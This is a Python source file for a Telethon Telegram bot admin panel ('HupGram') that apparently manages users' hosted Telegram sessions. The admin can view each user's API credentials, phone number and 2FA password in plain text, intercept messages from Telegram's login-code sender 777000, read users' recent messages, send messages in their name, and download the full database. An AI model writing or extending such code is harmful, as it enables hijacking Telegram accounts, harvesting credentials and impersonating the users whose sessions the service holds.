import os
import aiosqlite
from telethon import events, Button
from config import ADMIN_ID, DB_PATH, SESSIONS_FOLDER
from loader import bot, active_clients, auth_state
from database import get_settings, update_setting, get_last_messages

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_handler(event):
    if event.sender_id != ADMIN_ID: return
    await event.respond("👑 **ADMIN PANEL HupGram**", buttons=[
        [Button.inline("🆘 Пользователи", b'adm_users')],
        [Button.inline("⚙️ Управление модулями", b'mod_menu')],
        [Button.inline("📥 Скачать БД", b'adm_db')],
        [Button.inline("❌ Закрыть", b'refresh')]
    ])

@bot.on(events.CallbackQuery)
async def admin_callbacks(event):
    cid = event.chat_id
    data = event.data.decode()
    if cid != ADMIN_ID: return 

    # Игнорируем коллбеки модулей (они обрабатываются в mod_admin.py)
    if data.startswith('mod_'): return

    if data == 'adm_users':
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT owner_id, phone_number FROM settings") as c:
                rows = await c.fetchall()
        btn = []
        for r in rows:
            label = f"{r[0]} | {r[1] if r[1] else 'No Phone'}"
            btn.append([Button.inline(label, f'u_{r[0]}'.encode())])
        btn.append([Button.inline("🔙 Назад", b'admin_home')])
        await event.edit("🆘 **Выберите пользователя:**", buttons=btn)

    elif data.startswith('u_'):
        uid = int(data.split('_')[1])
        await render_user(event, uid)

    elif data.startswith('l_'):
        uid = int(data.split('_')[1])
        cfg = await get_settings(uid)
        await update_setting(uid, 'listen_777000', 0 if cfg['listen_code'] else 1)
        await render_user(event, uid)

    elif data.startswith('logs_'):
        uid = int(data.split('_')[1])
        msgs = await get_last_messages(uid, 10)
        text = f"📜 **Последние 10 сообщений ({uid}):**\n\n"
        if not msgs: text += "Пусто..."
        for m in msgs:
            text += f"👤 {m[0]} ({m[2]}): {m[1][:20]}... | {m[3]}\n"
        await event.edit(text, buttons=[[Button.inline("🔙 К юзеру", f'u_{uid}'.encode())]])

    elif data.startswith('kill_'):
        uid = int(data.split('_')[1])
        if uid in active_clients:
            try:
                await active_clients[uid].log_out()
                await active_clients[uid].disconnect()
            except: pass
            del active_clients[uid]
        s_path = os.path.join(SESSIONS_FOLDER, f"session_{uid}.session")
        if os.path.exists(s_path): os.remove(s_path)
        await update_setting(uid, 'api_id', 0)
        await update_setting(uid, 'api_hash', '')
        await event.answer("💀 Сессия убита!", alert=True)
        await render_user(event, uid)

    elif data.startswith('spam_'):
        uid = int(data.split('_')[1])
        if uid not in active_clients:
            await event.answer("⚠️ Юзер оффлайн, нельзя отправить!", alert=True)
            return
        auth_state[cid] = {'step': 'adm_spam_input', 'target_uid': uid}
        await event.edit(f"📝 **Отправка от лица {uid}**\n\nВведите: `username:текст сообщения`\nПример: `@durov:Привет!`", 
                         buttons=[[Button.inline("Отмена", f'u_{uid}'.encode())]])

    elif data == 'adm_db':
        await event.client.send_file(cid, DB_PATH)
    
    elif data == 'admin_home':
        await admin_handler(event)

async def render_user(event, uid):
    cfg = await get_settings(uid)
    is_online = uid in active_clients
    status = "🟢 Online" if is_online else "🔴 Offline"
    listen = "🔔 СЛУШАТЬ 777000: ВКЛ" if cfg['listen_code'] else "🔕 СЛУШАТЬ 777000: ВЫКЛ"
    
    txt = (
        f"👤 **USER:** `{uid}`\n"
        f"Stats: {status}\n\n"
        f"🔑 API ID: `{cfg.get('api_id', 'Нет')}`\n"
        f"🔐 API HASH: `{cfg.get('api_hash', 'Нет')}`\n"
        f"📱 Phone: `{cfg.get('phone', 'Нет')}`\n"
        f"🔐 2FA: `{cfg.get('password', 'Нет')}`\n"
    )
    btn = [
        [Button.inline(listen, f'l_{uid}'.encode())],
        [Button.inline("📜 Логи (Live)", f'logs_{uid}'.encode()), Button.inline("📝 Спам от юзера", f'spam_{uid}'.encode())],
        [Button.inline("💣 KILL SESSION", f'kill_{uid}'.encode())],
        [Button.inline("🔙 Список", b'adm_users')]
    ]
    try: await event.edit(txt, buttons=btn)
    except: pass